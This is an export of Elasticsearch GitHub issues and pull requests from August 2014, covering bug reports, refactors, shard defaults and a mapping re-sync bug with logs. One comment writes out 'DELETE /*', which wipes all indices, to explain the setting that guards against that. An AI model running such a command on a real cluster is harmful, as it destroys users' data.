</description><key id="39991759">7226</key><summary>Geo: Geohash_cell produces bad neighbors</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-11T19:29:18Z</created><updated>2014-08-13T07:44:29Z</updated><resolved>2014-08-13T07:42:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Change default for action.disable_delete_all_indices to true?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7225</link><project id="" key="" /><description>It seems really dangerous how easily one can delete all indices from Elasticsearch; it seems like we should disable this by default?
</description><key id="39990084">7225</key><summary>Change default for action.disable_delete_all_indices to true?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikemccand</reporter><labels><label>enhancement</label></labels><created>2014-08-11T19:11:01Z</created><updated>2014-09-10T19:11:11Z</updated><resolved>2014-08-11T20:30:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-11T19:45:06Z" id="51830391">@mikemccand we no longer have this option.  Instead, we now require you to specify something when performing a destructive action like deleting an index, eg:

```
DELETE /*
```

And the new setting, which disables wildcards for these APIs, is:

```
action.destructive_requires_name: true
```
</comment><comment author="mikemccand" created="2014-08-11T20:30:35Z" id="51836149">Ahhh that's great, thanks for clarifying.

So you must explicitly type a wildcard (/*) to remove all indices, so it's not so easy to do by accident anymore.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update frontends.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7224</link><project id="" key="" /><description>Simple search client for elastic search.
</description><key id="39980727">7224</key><summary>Update frontends.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">rdpatil4</reporter><labels><label>docs</label></labels><created>2014-08-11T17:30:17Z</created><updated>2014-08-20T07:35:24Z</updated><resolved>2014-08-18T10:59:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rdpatil4" created="2014-08-11T17:32:47Z" id="51812840">Simple search client for elastic search.
</comment><comment author="clintongormley" created="2014-08-12T08:11:14Z" id="51885371">Hi @rdpatil4 

Please can you sign the CLA so that we can get this merged in.
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="rdpatil4" created="2014-08-13T19:11:12Z" id="52095746">Done, signed the CLA
</comment><comment author="rdpatil4" created="2014-08-19T19:35:44Z" id="52686977">Hi @clintongormley,

I still do not see my changes on http://www.elasticsearch.org/guide/en/elasticsearch/client/community/current/front-ends.html
Is there a delay for sync up or something is wrong?
</comment><comment author="clintongormley" created="2014-08-20T07:35:24Z" id="52743135">@rdpatil4 yes, we're having problems with the doc sync at the moment.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Changed every single index operation to not replace the index within the original request</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7223</link><project id="" key="" /><description>An anti-pattern that we have in our code, noticeable if you use java API, is that we modify incoming requests by replacing the index or alias with the concrete index. This way not only the original user request has changed, but all following communications that use that request will lose the information on whether the original request was performed against an alias or an index, and its name.

Refactored the following base classes: `TransportShardReplicationOperationAction`, `TransportShardSingleOperationAction`, `TransportSingleCustomOperationAction`, `TransportInstanceSingleOperationAction` and all subclasses by introducing an InternalRequest object that holds the original request plus additional info (e.g. the concrete index). This internal request doesn't get sent over the transport but rebuilt on each node on demand (not different to what currently happens anyway, as concrete index gets re-set on each node). When the request becomes a shard level request, instead of using the only int shardId we serialize the `ShardId` that contains both concrete index name (which might then differ from the original one within the request) and shard id.

Using this pattern we can move get, multi_get, explain, analyze, term_vector, multi_term_vector, index, delete, update, bulk to not replace the index name with the concrete one within the request. The index name within the original request will stay the same.

Made it also clearer within the different transport actions when the index needs to be resolved (user facing requests) and when that's not needed (e.g. shard level request), by exposing `resolveIndex` method. Moved check block methods to parent classes as their content was always the same on every subclass.

Improved existing tests by randomly introducing the use of an alias, and verifying that the responses always contain the concrete index name and not the original one, as that's the expected behaviour.

Added backwards compatibility tests to make sure that the change is applied in a backwards compatible manner.
</description><key id="39979393">7223</key><summary>Changed every single index operation to not replace the index within the original request</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-11T17:15:51Z</created><updated>2015-06-07T12:25:45Z</updated><resolved>2014-08-12T11:30:06Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-11T20:57:28Z" id="51839667">I left some questions, but big +1 on the proposed refactoring!
</comment><comment author="javanna" created="2014-08-12T08:15:45Z" id="51885728">Updated according to feedback I got
</comment><comment author="jpountz" created="2014-08-12T09:29:44Z" id="51892328">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Allow CliTool to write out stacktraces</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7222</link><project id="" key="" /><description>In order to have the possibility of debugging on the command line, the user
now can either set the ES_CLI_DEBUG environment variable or at es.cli.debug system
property which results in stack traces being written to stdout.
</description><key id="39974829">7222</key><summary>Test: Allow CliTool to write out stacktraces</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-11T16:25:18Z</created><updated>2015-06-07T12:25:55Z</updated><resolved>2014-08-12T16:19:54Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="uboness" created="2014-08-11T16:34:08Z" id="51804982">left a few comments, otherwise LGTM
</comment><comment author="spinscale" created="2014-08-12T10:28:38Z" id="51897501">@uboness incorporated all of your review comments, were all good and valid. thx!
</comment><comment author="uboness" created="2014-08-12T14:48:53Z" id="51924370">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Adjusted TermVectorRequest serialization to not serialize and de-serialize the index twice</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7221</link><project id="" key="" /><description /><key id="39972582">7221</key><summary>Adjusted TermVectorRequest serialization to not serialize and de-serialize the index twice</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-11T16:00:34Z</created><updated>2015-06-07T12:26:36Z</updated><resolved>2014-08-12T08:34:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-11T20:59:34Z" id="51839953">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make sure that multi fields are serialized in a consistent order.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7220</link><project id="" key="" /><description>This ensure that the source is the same and avoids unnecessary mapping re-syncs.

PR for #7215
</description><key id="39968317">7220</key><summary>Make sure that multi fields are serialized in a consistent order.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>:Mapping</label><label>bug</label><label>v1.2.4</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-11T15:16:48Z</created><updated>2015-06-07T19:10:51Z</updated><resolved>2014-08-11T17:24:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-08-11T15:22:26Z" id="51795009">LGTM, I think we should back port to 1.2 branch as well just in case we do a release there. 
</comment><comment author="martijnvg" created="2014-08-11T17:24:41Z" id="51811747">Pushed via: a40cb169b6a53d8855e9f1ed0e312ca347c76f8b
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Unassigned shards after updating # of replica</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7219</link><project id="" key="" /><description>Hi,
I am using ES 0.90.13 with 10 clusters. Java Sun 1.7.53. 

We find out that the # of replicas on our ES clusters was zero. 
Hence, we increased the # of replica last week on ES2 to 1. 
Since then the cluster became yellow &lt;-&gt; green. It runs fine for several hours and then became yellow (with X unassigned shards). After few hours it became green. 

Most of the time it became green, but from time few time it is stacked on 2 unassigned shards.

From the logs:

[index.shard.service      ] [es2-s01] [ds77777][3] suspect illegal state: trying to move shard from primary mode to replica mode

[2014-08-11 00:33:10,384][WARN ][cluster.action.shard     ] [es2-s02] [ds6765431_1_s][1] sending failed shard for [ds6765431_1_s][1], node[M34ta1aGTv-S4ahkrXK5DA], [R], s[STARTED], indexUUID [4T8zV8r7RUu8UkvQYsoz3w], reason [master [es2-s03][4rJC0nkVR1SgZhAcOK2MZw][inet[/10.1.112.3:9300]]{data_center=ny4, max_local_storage_nodes=1, master=true} marked shard as started, but shard has not been created, mark shard as failed]

This is a producation cluster. Please assist.
Yaniv
</description><key id="39964117">7219</key><summary>Unassigned shards after updating # of replica</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">yanivgig</reporter><labels /><created>2014-08-11T14:35:49Z</created><updated>2014-08-11T16:15:44Z</updated><resolved>2014-08-11T16:15:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-11T16:15:44Z" id="51802501">Hi @yanivgig 

The github issues list is for bug reports and feature requests. Please use the forum to ask questions like these.  You need to find out from the logs **why** your shards are failing.  
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Store index creation time in index metadata</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7218</link><project id="" key="" /><description>This change stores the index creation time in the index metadata when an index is created.  The creation time cannot be changed but can be set as part of the create index request to allow for correct creation times for historical data.

Closes #7119
</description><key id="39945448">7218</key><summary>Store index creation time in index metadata</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Settings</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-11T10:24:39Z</created><updated>2015-06-07T12:26:50Z</updated><resolved>2014-08-12T20:46:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-11T10:32:39Z" id="51764203">Although my comment is not directly related to the PR, I think that if we can also support `last_update` metadata, it would give us some new features to detect cold indices for examples and create some rules in the future such as:
- Automatically close indices which has not been updated for 2 months
- Automatically optimize cold indices (no update in the last 3 days)

Related to #3933 
</comment><comment author="jpountz" created="2014-08-12T12:50:30Z" id="51909131">Left one comment but other than that it looks good to me.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update README.textile</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7217</link><project id="" key="" /><description>With a raw checkout, people need to build the thing.  I realize there is more to do here, the maven build just creates an installer?  The suggestion here is that it would be nice to clone the repo and have all the instructions necessary to build and run to get it running quickly from source.

So it could go something like this:

Configure the install package type that will be built: how to set buidl of tar vs deb installer?
Build using Maven: Run @mvn clean package -DskipTests@
     Note: you will need java jdk 1.7 or greater and JAVA_HOME defined.
Find the installer package and run: .... 
cd [intstall location] 
untar -tvf blah.tar.gz
Change to the installation: cd blah

then the rest...
</description><key id="39890442">7217</key><summary>Update README.textile</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">robblovell</reporter><labels /><created>2014-08-09T17:53:46Z</created><updated>2014-08-11T12:05:16Z</updated><resolved>2014-08-11T12:05:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-11T12:05:16Z" id="51771539">Hi @robblovell 

I don't think that's the right place to put the maven instructions.  Further down the README is a section on building from source: https://github.com/elasticsearch/elasticsearch#building-from-source

If you want to improve that section, that'd be welcome.

thanks
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Increase shard count in marvel index mapping</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7216</link><project id="" key="" /><description>Currently the mapping has;

```
         "index.number_of_replicas": "1",
         "index.number_of_shards": "1",
```

Can we up shards to 5, that's inline with the default in Elasticsearch's yml config for shards.
</description><key id="39883095">7216</key><summary>Increase shard count in marvel index mapping</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">markwalkom</reporter><labels /><created>2014-08-09T10:50:47Z</created><updated>2014-08-09T11:13:48Z</updated><resolved>2014-08-09T11:13:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-09T11:06:41Z" id="51683860">Why?  One shard is usually plenty for Marvel data, especially given that it creates a new index every day.  With 10 shards (5 primaries and 1 replica) created every day, you'll soon consume a lot of resources needlessly. The default was chosen for this reason. 

You can always override it locally if your needs are greater, but the defaults are good for the vast majority of users.
</comment><comment author="markwalkom" created="2014-08-09T11:13:48Z" id="51684001">I noticed it when I was playing with some mapping stuff I'm trying and thought it was a little low.

But I guess you're a step ahead and have already thought it all out :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Endless mapping re-sync problem</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7215</link><project id="" key="" /><description>1. We are running ES 1.3.1, but we had spotted this same issue on the previous versions as well
2. It can be solved temporarily by closing/opening index, but it will get back to such a state later

Corresponding mapping and index settings: https://gist.github.com/AVVS/bef59f42760256e2b5e8

Basically it looks like this and can last forever:

```
[2014-08-09 02:24:10,836][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:11,069][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:11,303][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:11,613][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:11,854][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:12,272][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:12,514][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:12,755][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:12,997][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:13,382][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:13,632][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:13,874][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:14,108][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:14,350][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:14,601][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:14,852][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:15,100][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:15,418][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:15,761][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:16,036][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:16,292][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:16,552][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:16,802][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:17,044][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:17,287][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:17,518][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:17,753][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:18,096][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:18,346][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:18,597][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:18,847][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:19,096][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:19,415][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:19,666][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:19,917][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:20,151][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:20,585][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:20,859][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:21,076][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:21,335][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:21,585][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:21,818][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:22,059][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
[2014-08-09 02:24:22,294][WARN ][cluster.metadata         ] [ubuntu74] [profiles-2014-08-01] re-syncing mappings with cluster state for types [[profiles_v1]]
```
</description><key id="39881978">7215</key><summary>Endless mapping re-sync problem</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">AVVS</reporter><labels><label>bug</label></labels><created>2014-08-09T09:30:09Z</created><updated>2015-04-14T13:04:29Z</updated><resolved>2014-08-11T17:02:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-09T10:00:08Z" id="51682602">Hi @AVVS 

How many nodes are you running? Could you add the relevant logs from the other nodes?

Do you have the same version of ES on all nodes? And the same version of the JVM?  Same version of the ICU plugin?

I presume you are actively indexing into this index? Does this message stop if you stop indexing?
</comment><comment author="AVVS" created="2014-08-09T10:17:47Z" id="51682920">1. 48 nodes: 41 data, 4 http balancer, 3 master nodes
2. ICU: 2.3.0, all nodes
3. openjdk 7_u55, all nodes

I'm indexing a lot, but this message has, sadly, nothing to do with it. If I stop it persists. One easy way to trigger it sooner is to add more replicas to the index.

Other nodes dont really have anything interesting: Master nodes have last messages from the 4 days ago about adding a node to the cluster except for the actual elected master. HTTP nodes dont have anything, data nodes have GC message from some 8 hours ago
</comment><comment author="AVVS" created="2014-08-09T10:25:05Z" id="51683059">One more thing: if I look at `_cat/pending_tasks` I notice that its at ~ 16,5k lines, a few lines are always about refreshing mappings, and the rest is the same message about dangling indices, but I guess it never gets to these tasks because its completely occupied with mapping refreshes

```
32662080    1s HIGH   refresh-mapping [profiles-2014-08-01][[profiles_v1]] 
32662081 892ms HIGH   refresh-mapping [profiles-2014-08-01][[profiles_v1]] 
32662082 850ms HIGH   refresh-mapping [profiles-2014-08-01][[profiles_v1]] 
...
32662084 845ms HIGH   refresh-mapping [profiles-2014-08-01][[profiles_v1]] 
...
4365952  3.7d NORMAL allocation dangled indices [test_index] 
...
```
</comment><comment author="clintongormley" created="2014-08-09T10:32:41Z" id="51683218">If you close the dangling indices, does it stop then?  Probably not, but worth a try.

For some reason the code in question thinks that your mapping has changed. I'm wondering if there is something that you've specified which isn't properly handled by the equals() method.  
https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/cluster/metadata/MetaDataMappingService.java#L257
</comment><comment author="AVVS" created="2014-08-09T10:36:34Z" id="51683299">I cant really close those dangling indices, they are not yet available:

```
{
   "error": "RemoteTransportException[[ubuntu74][inet[/10.10.100.74:9300]][indices/close]]; nested: IndexMissingException[[test_index] missing]; ",
   "status": 404
}
```

&lt;br/&gt;

&gt; For some reason the code in question thinks that your mapping has changed. I'm wondering if there is something that you've specified which isn't properly handled by the equals() method.

What data can I provide to help with testing this?
</comment><comment author="clintongormley" created="2014-08-09T11:04:05Z" id="51683803">Not sure yet - I'll come back to you with more.
